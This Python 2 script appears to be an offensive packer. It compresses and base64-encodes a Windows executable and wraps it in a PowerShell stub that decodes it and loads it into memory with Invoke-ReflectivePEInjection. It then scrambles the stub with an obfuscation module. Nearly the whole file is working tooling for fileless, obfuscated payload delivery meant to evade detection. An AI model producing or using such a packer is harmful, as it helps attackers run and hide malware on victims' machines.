import sys
import gzip
import base64
import StringIO

import PoshCrypt

#execute_ps = "$x = [System.Text.Encoding]::ASCII.GetString($msDecompressedPayload.ToArray()); Invoke-Expression $x;"

# at present, users will have to know ahead of time the architecture of their PE and target machine
# http://karlprosser.com/coder/2011/11/04/calling-powershell-64bit-from-32bit-and-visa-versa/

class PoshAsMyPacker:
    def __init__(self, pe_data, reflective_loader):
        self.decompress_and_execute = """while($true){$read=$gzipStream.Read($buffer,0,1024); if($read -gt 0){$msDecompressedPayload.Write($buffer,0,$read)}else{break}} $gzipStream.Close();Invoke-ReflectivePEInjection -PEBytes $msDecompressedPayload.ToArray()"""
        self.pe_data = pe_data
        self.reflective_loader = reflective_loader
    def encode_and_compress(self, data):
        out = StringIO.StringIO()
        with gzip.GzipFile(fileobj=out, mode="w") as f:
            f.write(data)
        return base64.b64encode(out.getvalue())
    def build_stub(self):
        self.payload = """{0}
$encodedPayload="{1}"
$buffer=New-Object byte[](1024)
$msDecompressedPayload=New-Object System.IO.MemoryStream
$decodedPayload=[System.Convert]::FromBase64String($encodedPayload)
$msDecodedPayload=New-Object System.IO.MemoryStream (,$decodedPayload)
$gzipStream=New-Object System.IO.Compression.GzipStream $msDecodedPayload, ([IO.Compression.CompressionMode]::Decompress)
""".format(self.reflective_loader, self.encode_and_compress(self.pe_data))+self.decompress_and_execute
        return self.payload

    def pack_exe(self):
        # generate a powershell script to run an executable file
        return self.build_stub()

with open(sys.argv[2], "rb") as f:
    with open(sys.argv[1], "r") as g:
        p = PoshAsMyPacker(f.read(), g.read())
        c = PoshCrypt(p.pack_exe())
        print c.squash_and_scramble()
